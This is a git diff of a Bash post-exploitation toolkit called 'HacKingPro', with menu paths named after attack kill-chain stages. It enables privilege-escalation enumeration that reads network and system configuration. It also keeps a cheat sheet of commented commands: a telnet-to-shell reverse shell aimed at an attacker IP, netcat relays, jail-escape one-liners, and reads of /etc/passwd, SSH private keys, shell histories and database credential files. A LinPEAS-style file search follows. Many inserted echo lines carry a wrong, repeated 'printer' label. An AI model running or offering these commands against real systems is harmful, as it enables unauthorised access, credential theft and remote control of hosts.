   x_Menu_1="${MainDirectoriy}/Menu/AnLoMinus/01--Reconnaissance & Information Gathering/"
   x_Menu_1_CLI="${x_Menu_1}CLI - Collecting Local Information/"
   x_Menu_1_CSI="${x_Menu_1}CSI - Collecting Social Information/"
   x_Menu_1_CNI="${x_Menu_1}CNI - Collecting Network Information/"
   x_Menu_1_CMI="${x_Menu_1}CMI - Collecting Machine Information/"
   x_Menu_1_CPI="${x_Menu_1}CPI - Collecting Public Information/"
+  # [2] Weaponization PATH:
   x_Menu_2="${MainDirectoriy}/Menu/AnLoMinus/02--Weaponization"
   x_Menu_2_Android="${x_Menu_2}/Android"
   x_Menu_2_BrutePort="${x_Menu_2}/Brute Force"
   x_Menu_2_Winndows="${x_Menu_2}/Windows"
+  # [3] Delivery PATH
   x_Menu_3="${MainDirectoriy}/Menu/AnLoMinus/03--Delivery/"
+  # [4] Exploitation PATH
   x_Menu_4="${MainDirectoriy}/Menu/AnLoMinus/04--Exploitation/"
+  # [5] Installation PATH
   x_Menu_5="${MainDirectoriy}/Menu/AnLoMinus/05--Installation/"
+  # [6] Command and Control PATH
   x_Menu_6="${MainDirectoriy}/Menu/AnLoMinus/06--Command and Control/"
+  # [7] Actions on Objective PATH
   x_Menu_7="${MainDirectoriy}/Menu/AnLoMinus/07--Actions on Objective/"
-  x_Menu_8="${MainDirectoriy}/Menu/AnLoMinus/AK--AttacKing/"
 
 
   Recon_File="${MainDirectoriyCaseNameRecon}/${targetNAME}-HacKingPro-Recon-Log.md"  # Define Recon File
 
   # Checking Directories of HacKingPro TooL
-  if [ -d Menu ]; then
-    echo "\n\t  ${BYellow}[${BGreen}GIT${BYellow}] ${BGreen}Working${ORANGE} $MainDirectoriy\n${faintT}"
+  if [ -s Menu ]; then
+    echo "\n    MainDirectoriy=${faintT}${MainDirectoriy}${resetT}"
+
+    echo "\n\t  ${BYellow}[${BGreen}ls -lhs${BYellow}] ${BGreen} HacKingPro  ${ORANGE} $MainDirectoriy\n${faintT}"
     ls -lhs
     echo "${resetT}"
-    echo "\n\t  ${BYellow}[${BGreen}GIT${BYellow}] ${BGreen}Listing${ORANGE} $MainDirectoriy/Menu\n${faintT}"
+    sleep 0.1
+
+    echo "\n\t  ${BYellow}[${BGreen}ls -lhs${BYellow}] ${BGreen} /Menu ${ORANGE} $MainDirectoriy/Menu\n${faintT}"
     ls -lhs Menu
     echo "${resetT}"
-    echo "\n\t  ${BYellow}[${BGreen}GIT${BYellow}] ${BGreen}Listing${ORANGE} $MainDirectoriy/Menu/AnLoMinus\n${faintT}"
-    ls -lhs Menu/AnLoMinus
-    echo "${resetT}"
-    echo "\n\t  ${BYellow}[${BGreen}GIT${BYellow}] ${BGreen}Listing${ORANGE} $MainDirectoriy/Menu/AnyTool\n${faintT}"
-    ls -lhs Menu/AnyTool
-    echo "${resetT}"
-    echo "\n\t  ${BYellow}[${BGreen}GIT${BYellow}] ${BGreen}Listing${ORANGE} $MainDirectoriy/Menu/Resources\n${faintT}"
-    ls -lhs Menu/Resources
-    echo "${resetT}"
+    sleep 0.1
+
+    if [ -s Menu/AnLoMinus ]; then
+      echo "\n\t  ${BYellow}[${BGreen}ls -lhs${BYellow}] ${BGreen} /Menu/AnLoMinus ${ORANGE} $MainDirectoriy/Menu/AnLoMinus\n${faintT}"
+      ls -lhs Menu/AnLoMinus
+      echo "${resetT}"
+      sleep 0.1
+    fi
+    if [ -s Menu/AnyTool ]; then
+      echo "\n\t  ${BYellow}[${BGreen}ls -lhs${BYellow}] ${BGreen} /Menu/AnyTool ${ORANGE} $MainDirectoriy/Menu/AnyTool\n${faintT}"
+      ls -lhs Menu/AnyTool
+      echo "${resetT}"
+      sleep 0.1
+    fi
+    if [ -s Menu/Resources ]; then
+      echo "\n\t  ${BYellow}[${BGreen}ls -lhs${BYellow}] ${BGreen} /Menu/Resources ${ORANGE} $MainDirectoriy/Menu/Resources\n${faintT}"
+      ls -lhs Menu/Resources
+      echo "${resetT}"
+      sleep 0.1
+    fi
+  else
+    read -p "${Press_ENTER}"
+    echo "    ${BGreen}Can't Find Main ${ORANGE}Menu ${BGreen}Folder]"
+    sleep 1
     read -p "${Press_ENTER}"
   fi
-  echo "\n\n\t\t MainDirectoriy=${faintT}${MainDirectoriy}"
+  sleep 0.1
   read -p "${Press_ENTER}"
 
 }
@@ -1498,10 +1748,10 @@ Arsenal(){
 }
 
 ###############################################
-#         Privileg Escalation
+#         Privileg Escalation Pro
 ###############################################
 
-Privileg_Escalation(){
+PrivilegEscalationPro(){
   while true; do
     cd "$x_Menu_2"
     clear
@@ -1535,7 +1785,9 @@ Privileg_Escalation(){
     read -p "$HacKingProMenuMain" cmd
     case $cmd in
       lpp|LPP )
-      LinPrivPro
+      File_LinPrivPro="${MainDirectoriyCaseNameLocal}/${targetNAME}-HacKingPro-LinPrivPro-Log.md"  # Define Recon File
+      LinPrivPro >> ${File_LinPrivPro}
+      less -R ${File_LinPrivPro}
       read -p "${Press_ENTER}"
       ;;
       lpe|LPE )
@@ -1718,15 +1970,14 @@ LinPrivPro(){
 
     echo "    ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
     What applications are installed? What version are they? Are they currently running?"
-#
-# ls -alh /usr/bin/
-# ls -alh /sbin/
-# dpkg -l
+    ls -alh /usr/bin/
+    ls -alh /sbin/
+    dpkg -l
 # rpm -qa
-# ls -alh /var/cache/apt/archivesO
-# ls -alh /var/cache/yum/
+    ls -alh /var/cache/apt/archivesO
+    ls -alh /var/cache/yum/
 #
-#     echo "    ${DGrey}|──╼ ${BRed}[${ORANGE} Any of the service(s) settings misconfigured? ${BRed}]${BYellow}╼▰  Are any (vulnerable) plugins attached?"
+    echo "    ${DGrey}|──╼ ${BRed}[${ORANGE} Any of the service(s) settings misconfigured? ${BRed}]${BYellow}╼▰  Are any (vulnerable) plugins attached?"
 #
 # cat /etc/syslog.conf
 # cat /etc/chttp.conf
@@ -1739,7 +1990,7 @@ LinPrivPro(){
 # cat /opt/lampp/etc/httpd.conf
 # # ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
 #
-#     echo "    ${DGrey}|──╼ ${BRed}[${ORANGE} What jobs are scheduled? ${BRed}]${BYellow}╼▰  "
+    echo "    ${DGrey}|──╼ ${BRed}[${ORANGE} What jobs are scheduled? ${BRed}]${BYellow}╼▰  "
 # crontab -l
 # ls -alh /var/spool/cron
 # ls -al /etc/ | grep cron
@@ -1753,7 +2004,7 @@ LinPrivPro(){
 # cat /etc/anacrontab
 # cat /var/spool/cron/crontabs/root
 #
-#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
 #
 # Any plain text usernames and/or passwords?
 # grep -i user [filename]
@@ -1761,15 +2012,14 @@ LinPrivPro(){
 # grep -C 5 "password" [filename]
 # find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla
 #
-#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
+echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a Communications & NetWorKing? ${BRed}]${BYellow}╼▰"
+echo "${DGrey}|──╼ ${BRed}[${ORANGE} What NIC(s) does the system have? Is it connected to another network? ${BRed}]${BYellow}╼▰"
 #
-# Communications & NetWorKing
-# What NIC(s) does the system have? Is it connected to another network?
-# /sbin/ifconfig -a
-# cat /etc/network/interfaces
-# cat /etc/sysconfig/network
+/sbin/ifconfig -a
+cat /etc/network/interfaces
+cat /etc/sysconfig/network
 #
-#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
 #
 # What are the network configuration settings? What can you find out about this network? DHCP server? DNS server? Gateway?
 # cat /etc/resolv.conf
@@ -1779,7 +2029,7 @@ LinPrivPro(){
 # hostname
 # dnsdomainname
 #
-#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
 #
 # What other users & hosts are communicating with the system?
 # lsof -i
@@ -1793,20 +2043,20 @@ LinPrivPro(){
 # last
 # w
 #
-#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
 #
 # Whats cached? IP and/or MAC addresses
 # arp -e
 # route
 # /sbin/route -nee
 #
-#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
 #
 # Is packet sniffing possible? What can be seen? Listen to live traffic
 # # tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]
 # tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21
 #
-#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
 #
 # Have you got a shell? Can you interact with the system?
 # # http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/
@@ -1814,38 +2064,38 @@ LinPrivPro(){
 # nc -lvp 4445    # Attacker. Ouput (Results)
 # telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!
 #
-#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
 #
 # Is port forwarding possible? Redirect and interact with traffic from another view
 # # rinetd
 # # http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch
 #
-#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
+    echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
 #
 # # fpipe
 # # FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]
 # FPipe.exe -l 80 -r 80 -s 80 192.168.1.7
 #
-#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
+echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
 #
 # # ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]
 # ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
 # ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port
 #
-#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
+echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
 #
 # # mknod backpipe p ; nc -l -p [remote port] < backpipe  | nc [local IP] [local port] >backpipe
 # mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe    # Port Relay
 # mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Port 80 to 8080)
 # mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)
 #
-#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
+echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
 #
 # Is tunnelling possible? Send commands locally, remotely
 # ssh -D 127.0.0.1:9050 -N [username]@[ip]
 # proxychains ifconfig
 #
-#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
+echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
 #
 # Confidential Information & Users
 # Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?
@@ -1859,7 +2109,7 @@ LinPrivPro(){
 # cat /etc/sudoers
 # sudo -l
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
+echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
 #
 # What sensitive files can be found?
 # cat /etc/passwd
@@ -1868,21 +2118,21 @@ LinPrivPro(){
 # ls -alh /var/mail/
 #
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
+echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
 #
 # Anything "interesting" in the home directorie(s)? If its possible to access
 # ls -ahlR /root/
 # ls -ahlR /home/
 #
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
+echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
 #
 # Are there any passwords in; scripts, databases, configuration files or log files? Default paths and locations for passwords
 # cat /var/apache2/config.inc
 # cat /var/lib/mysql/mysql/user.MYD
 # cat /root/anaconda-ks.cfg
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
+echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
 #
 # What has the user being doing? Is there any password in plain text? What have they been edting?
 # cat ~/.bash_history
@@ -1891,7 +2141,7 @@ LinPrivPro(){
 # cat ~/.mysql_history
 # cat ~/.php_history
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
+echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
 #
 # What user information can be found?
 # cat ~/.bashrc
@@ -1899,7 +2149,7 @@ LinPrivPro(){
 # cat /var/mail/root
 # cat /var/spool/mail/root
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
+echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
 #
 # Can private-key information be found?
 # cat ~/.ssh/authorized_keys
@@ -1918,7 +2168,7 @@ LinPrivPro(){
 # cat /etc/ssh/ssh_host_key.pub
 # cat /etc/ssh/ssh_host_key
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
+echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
 #
 # File Systems
 # Which configuration files can be written in /etc/? Able to reconfigure a service?
@@ -1930,7 +2180,7 @@ LinPrivPro(){
 # find /etc/ -readable -type f 2>/dev/null                         # Anyone
 # find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
+echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
 #
 # What can be found in /var/ ?
 # ls -alh /var/log
@@ -1941,7 +2191,7 @@ LinPrivPro(){
 # ls -alh /var/lib/mysql
 # cat /var/lib/dhcp3/dhclient.leases
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
+echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
 #
 # Any settings/files (hidden) on website? Any settings file with database information?
 # ls -alhR /var/www/
@@ -1950,7 +2200,7 @@ LinPrivPro(){
 # ls -alhR /opt/lampp/htdocs/
 # ls -alhR /var/www/html/
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
+echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
 #
 # Is there anything in the log file(s) (Could help with "Local File Includes"!)
 # # http://www.thegeekstuff.com/2011/08/linux-var-log-files/
@@ -1994,43 +2244,43 @@ LinPrivPro(){
 # ls -alh /var/log/samba/
 # # auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
+echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
 #
 # If commands are limited, you break out of the "jail" shell?
 # python -c 'import pty;pty.spawn("/bin/bash")'
 # echo os.system('/bin/bash')
 # /bin/sh -i
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
+echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
 #
 # How are file-systems mounted?
 # mount
 # df -h
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
+echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
 #
 # Are there any unmounted file-systems?
 # cat /etc/fstab
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
-#
+echo "{DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
+
 # What "Advanced Linux File Permissions" are used? Sticky bits, SUID & GUID
 # find / -perm -1000 -type d 2>/dev/null    # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here
 # find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the  group, not the user who started it.
 # find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the  owner, not the user who started it.
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
+echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
 #
 # find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
 # for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
+# echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
 #
 # # find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
 # find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
 #
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
+echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
 #
 # Where can written to and executed from? A few 'common' places: /tmp, /var/tmp, /dev/shm
 # find / -writable -type d 2>/dev/null        # world-writeable folders
@@ -2041,13 +2291,13 @@ LinPrivPro(){
 #
 # find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null   # world-writeable & executable folders
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
+echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
 #
 # Any "problem" files? Word-writeable, "nobody" files
 # find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
 # find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
+echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
 #
 # Preparation & Finding Exploit Code
 # What development tools/languages are installed/supported?
@@ -2056,7 +2306,7 @@ LinPrivPro(){
 # find / -name gcc*
 # find / -name cc
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
+echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
 #
 # How can files be uploaded?
 # find / -name wget
@@ -2065,7 +2315,7 @@ LinPrivPro(){
 # find / -name tftp*
 # find / -name ftp
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
+echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
 #
 # Finding exploit code
 # http://www.exploit-db.com
@@ -2078,7 +2328,7 @@ LinPrivPro(){
 # http://seclists.org/fulldisclosure/
 # http://www.google.com
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
+echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
 #
 # Finding more information regarding the exploit
 # http://www.cvedetails.com
@@ -2086,7 +2336,7 @@ LinPrivPro(){
 # http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]
 # http://www.vulnview.com/cve-details.php?cvename=[CVE]
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
+echo "${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰"
 #
 # (Quick) "Common" exploits. Warning. Pre-compiled binaries files. Use at your own risk
 # http://tarantula.by.ru/localroot/
@@ -3201,99 +3451,99 @@ FunLinPEAS(){
     CONT_THREADS=0 #Reset the threads counter
 
     #GENERATE THE STORAGES OF THE FOUND FILES
-    PSTORAGE_SYSTEMD=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/usr|^/lib64|^/opt|^/systemd|^/bin|^/etc|^/lib32|^/private|^/run|^/tmp|^/lib|^/system|^/applications|^/.cache|^/srv|^/snap|^$GREPHOMESEARCH|^/sbin|^/sys|^/var|^/mnt|^/cdrom|^/media" | grep -E ".*\.service$" | sort | uniq | head -n 70)
-    PSTORAGE_TIMER=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/usr|^/lib64|^/opt|^/systemd|^/bin|^/etc|^/lib32|^/private|^/run|^/tmp|^/lib|^/system|^/applications|^/.cache|^/srv|^/snap|^$GREPHOMESEARCH|^/sbin|^/sys|^/var|^/mnt|^/cdrom|^/media" | grep -E ".*\.timer$" | sort | uniq | head -n 70)
-    PSTORAGE_SOCKET=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/usr|^/lib64|^/opt|^/systemd|^/bin|^/etc|^/lib32|^/private|^/run|^/tmp|^/lib|^/system|^/applications|^/.cache|^/srv|^/snap|^$GREPHOMESEARCH|^/sbin|^/sys|^/var|^/mnt|^/cdrom|^/media" | grep -E ".*\.socket$" | sort | uniq | head -n 70)
-    PSTORAGE_DBUS=$(echo -e "$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/etc" | grep -E "system\.d$" | sort | uniq | head -n 70)
-    PSTORAGE_MYSQL=$(echo -e "$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -v -E 'mysql/mysql' | grep -E '^/etc/.*mysql|/usr/var/lib/.*mysql|/var/lib/.*mysql' | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "mysql$" | sort | uniq | head -n 70)
-    PSTORAGE_MARIADB=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "mariadb\.cnf$|debian\.cnf$" | sort | uniq | head -n 70)
-    PSTORAGE_POSTGRESQL=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "pgadmin.*\.db$|pg_hba\.conf$|postgresql\.conf$|pgsql\.conf$" | sort | uniq | head -n 70)
-    PSTORAGE_APACHE=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM\n$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "sites-enabled$|000-default\.conf$|php\.ini$" | sort | uniq | head -n 70)
